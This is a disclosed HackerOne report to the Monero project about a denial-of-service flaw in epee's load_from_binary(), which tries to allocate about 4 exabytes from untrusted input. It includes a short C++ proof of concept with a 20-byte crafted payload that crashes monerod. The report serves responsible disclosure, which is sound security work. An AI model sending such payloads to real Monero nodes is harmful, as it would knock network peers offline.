# (remote) exabyte allocation via load_from_binary() (DoS)

## Report Details
- **Report ID**: 506498
- **URL**: https://hackerone.com/reports/506498
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-07T20:53:25.543Z
- **Disclosed**: 2019-07-03T00:12:02.972Z

## Reporter
- **Username**: guido
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
Changes introduced in commit b82efa32e can result in a denial of service if ```epee::serialization::portable_storage::load_from_binary()``` is called with untrusted data.

The 'reserve' method implemented here:
https://github.com/monero-project/monero/commit/b82efa32e771f653c5e49165b0659c67e2db3438#diff-8de201c60a8c7a3a0a4c2e15f2c0939bR75

will attempt to allocate about 4 exabytes of memory when you run the following code:

```cpp
#include <serialization/keyvalue_serialization.h>
#include <storages/portable_storage_template_helper.h>
#include <storages/portable_storage_base.h>
#include <p2p/p2p_protocol_defs.h>
#include <p2p/net_node.h>

int main(void)
{
    unsigned char payload[] = {
        0x01, 0x11, 0x01, 0x01, 0x01, 0x01, 0x02, 0x01, 0x01, 0x08, 0x00, 0x84,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    };

    const std::string s(payload, payload + 20);
    epee::serialization::portable_storage ps;
    ps.load_from_binary(s);
}
```

Although I haven't yet constructed a proof of concept against a live Monero instance, this can probably achieved by a remote attacker because the ```load_from_binary``` call occurs several times in the network code in ```contrib/epee/include/storages/levin_abstract_invoke2.h```.

Please let me know if this is sufficient, or that you require proof of concept code that can be used against peers on the network.

## Impact

Crash monerod

## Attachments
No attachments
